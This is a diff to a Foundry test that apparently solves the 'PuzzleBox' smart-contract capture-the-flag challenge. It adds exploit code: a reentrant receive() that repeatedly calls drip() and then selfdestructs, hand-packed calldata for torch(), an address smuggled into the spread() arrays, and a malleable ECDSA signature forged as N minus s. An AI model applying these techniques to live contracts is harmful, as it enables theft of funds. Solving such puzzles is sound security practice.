@@ -10,7 +10,7 @@ contract PuzzleBoxSolution is Test {
         console.log('lastDripId', puzzle.lastDripId());
         console.log('puzzle eth', address(puzzle).balance);
 
-        Operate operate = new Operate(puzzle);
+        Operate operate = new Operate(puzzle, address(this));
 
         console.log('operate', address(operate));
         console.log('Operate eth', address(operate).balance);
@@ -22,6 +22,7 @@ contract PuzzleBoxSolution is Test {
         operate.callDrip();
         console.log('Operate eth', address(operate).balance);
         console.log('Puzzle eth', address(puzzle).balance);
+        console.log('Solution eth', address(this).balance);
         console.log('puzzle.operator()', puzzle.operator());
         console.log('new lastDripId', puzzle.lastDripId());
         console.log('dripCount', puzzle.dripCount());
@@ -29,63 +30,61 @@ contract PuzzleBoxSolution is Test {
         //     console.log('isValidDripId %s', i, puzzle.isValidDripId(i));
         // }
 
-        address payable[] memory friends = new address payable[](2);
-        uint256[] memory friendsCutBps = new uint256[](friends.length);
-        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
-        friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
-        friendsCutBps[0] = 0.015e4;
-        friendsCutBps[1] = 0.0075e4;
+        puzzle.leak();
+        payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);
+        puzzle.zip();
+        console.log('isValidDripId %s', 1, puzzle.isValidDripId(1));
 
-        // address payable[] memory newFriends = new address payable[](1);
-        // uint256[] memory newFriendsBps = new uint256[](1);
+        puzzle.creep{gas: 98000}();
+        console.log('isValidDripId %s', 10, puzzle.isValidDripId(10));
 
-        // string memory newString = "fees41";
-        // newFriends[0] = payable(0x6e59dacfdb5d457304115bBFb9089531d873B700);
-        // newFriendsBps[0] = 0xC817dD2a5daA8f790677e399170c92AabD044b5700150;
-
-        // bytes32 originalHash = keccak256(abi.encodePacked('fees', friends, friendsCutBps));
-        // bytes32 newHash = keccak256(abi.encodePacked(newString, newFriends, newFriendsBps));
-        // console.log('BRRRRAA');
-        // console.logBytes32(originalHash);
-        // console.logBytes32(newHash);
-        puzzle.spread(friends, friendsCutBps);
-        console.log('isValidDripId %s', 3, puzzle.isValidDripId(3));
-        console.log('Puzzle eth', address(puzzle).balance);
-        // console.log('codeLengthFriend', (0x416e59DaCfDb5D457304115bBFb9089531D873B7).code.length);
-        // console.log('codeLengthFriend', (0xC817dD2a5daA8f790677e399170c92AabD044b57).code.length);
 
         // uint256[] memory dripIds = new uint256[];
         // bytes memory encodedDripIds = abi.encode([1, 2]);//, 4, 6, 7, 8, 9
-        uint256[] memory inputArray = new uint256[](5);
+        uint256[] memory inputArray = new uint256[](6);
         inputArray[0] = 2;
         inputArray[1] = 4;
         inputArray[2] = 6;
         inputArray[3] = 7;
         inputArray[4] = 8;
-        // inputArray[5] = 9;
+        inputArray[5] = 9;
         // inputArray[6] = 9;
         bytes memory encodedDripIds = abi.encode(inputArray);
         console.log('encodedDripIdsLength', encodedDripIds.length);
-        puzzle.torch(encodedDripIds);
-        // 0x925facb1
+        // puzzle.torch(encodedDripIds);
+        (bool success,) = address(puzzle).call(abi.encodePacked(
+                            puzzle.torch.selector, uint256(0x01), uint8(0), encodedDripIds));
+        // (bool success,) = address(puzzle).call(abi.encodeWithSignature("torch(bytes)", encodedDripIds));
+        require(success, "call failed");
 
+        address payable[] memory friends = new address payable[](1);
+        uint256[] memory friendsCutBps = new uint256[](3);
+        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
+        friendsCutBps[0] = uint160(bytes20(0xC817dD2a5daA8f790677e399170c92AabD044b57));
+        friendsCutBps[1] = 0.015e4;
+        friendsCutBps[2] = 0.0075e4;
+
+        puzzle.spread(friends, friendsCutBps);
+        console.log('isValidDripId %s', 3, puzzle.isValidDripId(3));
+        console.log('Puzzle eth', address(puzzle).balance);
 
         console.log('admin', puzzle.admin());
-        // console.log('adminCodeLength', puzzle.admin().code.length);
 
-        for(uint256 i = 1; i <= 972; i++) {
-            puzzle.leak();
-        }
-        console.log('Puzzle eth', address(puzzle).balance);
-        puzzle.creep();
-        console.log('Puzzle eth', address(puzzle).balance);
-        for(uint256 i = 1; i <= 6; i++) {
-            puzzle.leak();
-        }
-        console.log('Puzzle eth', address(puzzle).balance);
+        uint256 SECP256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
+        uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
+        uint256 r = uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8);
+        uint256 s = SECP256k1N - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df);
 
-        // readjust abi.encodePacked
-        // befriend for apt friends, friendCutBps
+        // bytes32 threshold = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
+        // uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
+        // bytes32 r = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
+        // bytes32 s_ = 0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df;
+        // bytes32 s = threshold - s_;
+
+        console.logBytes32(bytes32(s));
+        uint8 v = 27;
+        bytes memory sign = abi.encodePacked(r, s, v);
+        puzzle.open(nonce, sign);
     }
 }
 
@@ -95,21 +94,25 @@ interface IPBProxy {
 
 contract Operate {
     PuzzleBox puzzle;
+    address solution;
     uint256 counter;
-    constructor(PuzzleBox _puzzle) payable {
+    constructor(PuzzleBox _puzzle, address _solution) payable {
         puzzle = _puzzle;
+        solution = _solution;
         puzzle.operate();
         IPBProxy(address(puzzle)).lock(bytes4(keccak256("torch(bytes)")), false);
     }
 
     function callDrip() external {
-        puzzle.drip{value: puzzle.dripFee() + 1}();
+        puzzle.drip{value: 101}();
     }
 
     receive() external payable {
         if(counter < 9) {
             ++counter;
-            puzzle.drip{value: puzzle.dripFee() + 1}();
+            puzzle.drip{value: 101}();
+        } else {
+            selfdestruct(payable(solution));
         }
     }
 }
